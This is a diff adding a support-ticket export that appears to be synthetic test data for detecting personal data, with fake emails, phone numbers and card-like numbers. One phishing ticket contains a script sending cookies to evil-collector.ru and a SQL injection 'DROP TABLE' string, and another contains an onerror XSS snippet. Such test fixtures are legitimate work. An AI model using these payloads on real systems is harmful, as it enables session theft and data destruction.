@@ -1,0 +1,52 @@
+Support Ticket Export
+------------------------------------------------------------
+
+Ticket #10234
+From: J. Uwimana <j.uwimana@alueducation.com>
+Subject: Cannot access student portal after password reset
+Message: Hi team, I tried logging in but it keeps failing. My alumni email is
+j.uwimana@alumni.alueducation.com in case the main one is locked. Can someone
+check on this? You can also reach me at +250 788 123 456 or 0788-123-456
+during office hours. Thanks!
+
+Ticket #10235
+From: siadmin@si.alueducation.com
+Subject: Refund request for duplicate charge
+We were charged twice for the same workshop. Card used ending in 4532015112830366,
+please reverse one of the charges. Full receipt is at https://payments.alu.edu/receipts/88213
+Second card attempted (declined): 1234 5678 9012 3456
+
+Ticket #10236
+From: contractor@gmail.com
+Subject: Invoice attached
+See attached invoice, total due is 1,240.00 USD. Contact number (202) 555-0143 for
+questions, or call 202.555.0199 after 5pm. My personal site is www.contractorworks.com
+and portfolio is at http://contractorworks.com/portfolio.
+
+Ticket #10237
+From: fake.alu@alueducation.com.phish-domain.net
+Subject: URGENT verify your account
+Click here to verify: http://alu-verify-account.ru/login?user=admin
+<script>document.location='http://evil-collector.ru/steal?c='+document.cookie</script>
+Also try this: '; DROP TABLE users; --
+Your account will be suspended unless you confirm within 24 hours.
+
+Ticket #10238
+From: student.helper@alumni.alueducation.com
+Subject: Group project coordination
+Team WhatsApp is +250790112233, backup contact 250-72-233-4455. Meeting notes
+doc: https://docs.google.com/document/d/1a2b3c4d5e/edit
+Card for the shared printing account (last resort, don't judge us): 4916 1234 5678 9994
+
+Ticket #10239
+From: notreally@si.alueducation.com.attacker.io
+Subject: Payment retry
+onerror="alert(document.cookie)" was found in the previous form submission,
+flagging for review. Amount attempted: $89.99, alt number 89.99 EUR mentioned once too.
+Legit contact for this account: kwizera.s@alueducation.com, phone 078-111-2233
+
+Ticket #10240
+From: random.person123@yahoo.com
+Subject: General inquiry
+No structured data of interest here, just checking if anyone still reads these tickets
+before they get archived at the end of the month.
